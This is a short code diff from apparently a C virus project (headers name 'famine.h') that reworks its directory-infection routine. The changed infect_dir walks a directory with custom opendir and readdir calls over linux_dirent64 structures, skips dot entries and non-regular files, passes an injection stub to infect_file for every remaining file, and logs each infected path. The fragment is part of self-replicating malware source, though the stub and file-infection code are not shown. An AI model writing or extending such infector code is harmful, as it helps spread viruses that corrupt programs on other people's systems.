@@ -1,6 +1,6 @@
 #include "../include/famine.h"
 
-static int is_regular(const char *path, const struct dirent *ent)
+static int is_regular(const char *path, const struct linux_dirent64 *ent)
 {
 	struct stat st;
 
@@ -30,16 +30,15 @@ static int join_path(char *buf, size_t size, const char *dir, const char *name)
 	return (0);
 }
 
-void infect_dir(const char *dir)
+void infect_dir(const char *dir, const unsigned char *stub, size_t stub_len)
 {
-	DIR				*d;
-	struct dirent	*ent;
-	char			path[PATH_MAX];
+	struct my_DIR			d;
+	struct linux_dirent64	*ent;
+	char					path[PATH_MAX];
 
-	d = opendir(dir);
-	if ( !d)
+	if (!opendir(&d, dir))
 		return ;
-	while ((ent = readdir(d)) != NULL)
+	while ((ent = readdir(&d)) != NULL)
 	{
 		if (ent->d_name[0] == '.' && (ent->d_name[1] == '\0' || (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
 			continue ;
@@ -47,8 +46,10 @@ void infect_dir(const char *dir)
 			continue ;
 		if (!is_regular(path, ent))
 			continue ;
-		infect_file(path);
+		infect_file(path, stub, stub_len);
+		LOG("infected file: %s\n", path);
 	}
-	closedir(d);
+	closedir(&d);
+	LOG("infected directory: %s\n", dir);
 }
 
